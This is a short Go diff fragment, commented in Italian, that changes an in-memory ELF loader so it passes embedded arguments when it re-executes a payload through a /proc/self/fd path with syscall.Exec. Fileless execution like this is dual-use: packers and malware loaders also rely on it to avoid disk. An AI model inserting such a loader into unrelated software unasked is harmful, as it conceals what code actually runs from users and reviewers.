@@ -93,7 +93,12 @@ func executeInMemory(payload []byte) {
 	fdPath := "/proc/self/fd/" + fdStr
 
 	// syscall.Exec rimpiazza il processo corrente con il nuovo binary
-	err := syscall.Exec(fdPath, os.Args, os.Environ())
+	args := make([]string, 0, len(elfEmbeddedArgs)+1)
+	args = append(args, fdPath)
+	if len(elfEmbeddedArgs) > 0 {
+		args = append(args, elfEmbeddedArgs...)
+	}
+	err := syscall.Exec(fdPath, args, os.Environ())
 
 	// Se arriviamo qui, Exec ha fallito - fallback
 	if err != nil {
